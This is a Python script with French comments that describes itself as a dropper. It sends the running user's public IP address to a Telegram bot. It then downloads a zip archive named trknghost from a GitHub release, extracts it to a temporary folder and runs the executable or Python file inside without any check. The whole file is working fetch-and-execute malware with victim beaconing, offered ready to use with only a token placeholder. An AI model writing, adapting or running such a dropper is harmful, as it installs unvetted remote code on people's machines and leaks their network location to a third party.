import os
import sys
import tempfile
import platform
import zipfile
import subprocess
from urllib.request import urlopen
from urllib.error import URLError, HTTPError
import requests

# --- CONFIG ---
BOT_TOKEN = "TON_BOT_TOKEN_ICI"  # Remplace par ton token Telegram
CHAT_ID_FILE = ".chatid"
URL = "https://github.com/trh4ckn0n/trknghost/releases/download/dl/trknghost.zip"

# --- Fonctions Telegram et IP ---
def get_public_ip():
    try:
        with urlopen("https://api.ipify.org") as response:
            ip = response.read().decode("utf-8")
            return ip
    except Exception:
        return "IP inconnue"

def save_chat_id(chat_id):
    with open(CHAT_ID_FILE, "w") as f:
        f.write(str(chat_id))

def load_chat_id():
    if os.path.isfile(CHAT_ID_FILE):
        with open(CHAT_ID_FILE, "r") as f:
            return f.read().strip()
    return None

def fetch_chat_id_from_updates():
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
    try:
        resp = requests.get(url, timeout=5)
        data = resp.json()
        if not data["ok"]:
            print("[!] Erreur getUpdates:", data)
            return None
        results = data.get("result", [])
        if not results:
            print("[!] Aucun update disponible, envoie un message au bot Telegram en premier !")
            return None
        last_update = results[-1]
        chat_id = None
        if "message" in last_update:
            chat_id = last_update["message"]["chat"]["id"]
        elif "callback_query" in last_update:
            chat_id = last_update["callback_query"]["message"]["chat"]["id"]
        return chat_id
    except Exception as e:
        print("[!] Exception lors getUpdates:", e)
        return None

def send_telegram_message(bot_token, chat_id, message):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        resp = requests.post(url, data=data, timeout=5)
        if resp.status_code == 200:
            print("[+] Notification Telegram envoyée.")
        else:
            print(f"[!] Erreur lors de l'envoi Telegram : {resp.status_code} {resp.text}")
    except Exception as e:
        print(f"[!] Exception lors de l'envoi Telegram : {e}")

# --- Fonctions Dropper originales ---
def download_file(url, dest_path):
    try:
        print(f"[*] Téléchargement de l'archive depuis {url}...")
        with urlopen(url) as response, open(dest_path, 'wb') as out_file:
            out_file.write(response.read())
        print("[+] Téléchargement terminé.")
    except (URLError, HTTPError) as e:
        print(f"Erreur lors du téléchargement: {e}")
        sys.exit(1)

def extract_zip(zip_path, extract_to):
    try:
        print(f"[*] Extraction de l'archive vers {extract_to} ...")
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(extract_to)
        print("[+] Extraction terminée.")
    except zipfile.BadZipFile as e:
        print(f"Erreur lors de l'extraction : {e}")
        sys.exit(1)

def run_executable(folder):
    system = platform.system()
    os.chdir(folder)
    if system == "Windows":
        exe_path = os.path.join(folder, "trknghost")
        if os.path.isfile(exe_path):
            print("[*] Lancement de trknghost")
            subprocess.run([exe_path])
        else:
            print("Erreur: trknghost.exe non trouvé.")
            sys.exit(1)
    else:
        py_path = os.path.join(folder, "trknghost.py")
        if os.path.isfile(py_path):
            print("[*] Lancement de trknghost.py avec Python")
            python = sys.executable or "python3"
            subprocess.run([python, py_path])
        else:
            print("Erreur: trknghost.py non trouvé.")
            sys.exit(1)

def notify_dropper_usage():
    chat_id = load_chat_id()
    if not chat_id:
        print("[*] Chat ID inconnu, tentative de récupération automatique via getUpdates...")
        chat_id = fetch_chat_id_from_updates()
        if not chat_id:
            print("[!] Impossible de récupérer le chat ID automatiquement.")
            print("[!] Pour régler ça, envoie un message à ton bot Telegram, puis relance ce script.")
            return
        save_chat_id(chat_id)
        print(f"[+] Chat ID sauvegardé : {chat_id}")
    else:
        print(f"[*] Chat ID chargé depuis fichier : {chat_id}")

    ip = get_public_ip()
    message = f"⚠️ *Dropper utilisé !*\nIP publique de l'utilisateur : `{ip}`"
    send_telegram_message(BOT_TOKEN, chat_id, message)

def main():
    notify_dropper_usage()
    with tempfile.TemporaryDirectory(prefix="trknghost_") as tmpdir:
        zip_path = os.path.join(tmpdir, "trknghost.zip")
        download_file(URL, zip_path)
        extract_zip(zip_path, tmpdir)
        run_executable(tmpdir)
        print("[*] Nettoyage terminé.")

if __name__ == "__main__":
    main()
